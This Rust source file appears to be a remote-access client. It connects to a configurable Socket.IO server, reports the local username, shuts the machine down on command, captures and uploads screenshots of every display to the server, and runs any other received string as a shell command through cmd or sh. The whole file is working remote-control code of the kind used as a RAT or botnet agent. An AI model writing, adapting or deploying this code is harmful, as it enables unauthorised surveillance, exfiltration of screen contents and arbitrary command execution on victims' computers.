use std::{fs, thread, time};
use std::process::Command;
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};
use std::time::Instant;
use reqwest::{Body, Client, multipart};
use rust_socketio::{ClientBuilder, Payload, RawClient};
use serde_json::json;

static SERVER_URL: &str = "SERVER_URL"; // Change it to your server URL.

fn main() {
    ClientBuilder::new(SERVER_URL.to_owned())
        .namespace("/")
        .on("comm", callback)
        .on("join", join_callback)
        .on("error", |err, _| eprintln!("Error: {:#?}", err))
        .connect()
        .expect("Connection failed");

    loop {
        thread::sleep(time::Duration::from_millis(1000));
    }
}

fn join_callback(_payload: Payload, socket: RawClient) {
    let user: String = whoami::username();
    println!("Emitting communication name as {}", &user);
    socket.emit("comm", json!({"name": &user})).expect("Server unreachable");
}

fn callback(payload: Payload, _socket: RawClient) {
    match payload {
        Payload::String(mut str) => {
            str = str.replace("\"", "");

            match str.as_str() {
                "shutdown" => {
                    system_shutdown::shutdown().expect("Did not work");
                }
                "ss" => {
                    let _ = Instant::now();
                    let screens = screenshots::Screen::all().unwrap();

                    for screen in screens {
                        println!("Scanning screen {} with res: {}x{}", screen.display_info.id, screen.display_info.width, screen.display_info.height);
                        let image = screen.capture().unwrap();
                        let buffer = image.buffer();

                        let path: String = format!("{}.png", screen.display_info.id);

                        println!("Writing file {}", &path);
                        fs::write(&path, &buffer).expect("Error writing file");

                        println!("Wrote file {}", &path);

                        let rt = tokio::runtime::Runtime::new().unwrap();

                        rt.block_on(async {
                            rq_post(&path).await.expect("Did not work");
                        });

                        println!("Waiting extra for post to complete (2 secs)");
                        thread::sleep(time::Duration::from_secs(2));
                        println!("Deleting file {}", &path);
                        fs::remove_file(&path).expect("Error removing file");
                        println!("Deleted {}", &path);
                    }
                }
                _ => {
                    println!("Received: {}, trying to execute it as a command", &str);
                    let output = if cfg!(target_os = "windows") {
                        Command::new("cmd")
                            .args(["/C", &str])
                            .output()
                            .expect("failed to execute process")
                    } else {
                        Command::new("sh")
                            .arg("-c")
                            .arg(&str)
                            .output()
                            .expect("failed to execute process")
                    };

                    println!("{}", String::from_utf8_lossy(&output.stdout));
                }
            }
        }
        Payload::Binary(bin_data) => println!("Received bytes: {:#?}", bin_data),
    }
}

async fn rq_post(file_name: &String) -> anyhow::Result<String> {
    println!("Sending file {}", file_name);
    let client = Client::new();
    let file = File::open(file_name).await?;

    let stream = FramedRead::new(file, BytesCodec::new());
    let fb = Body::wrap_stream(stream);
    let sf = multipart::Part::stream(fb)
        .file_name("imagen.png")
        .mime_str("image/png")?;

    let form = multipart::Form::new()
        .part("ss", sf);

    println!("Posting file {}", file_name);
    let response = client.post(SERVER_URL.to_owned() + "/image").multipart(form).send().await?;
    println!("Posted file {}", file_name);
    let result = response.text().await?;

    Ok(result)
}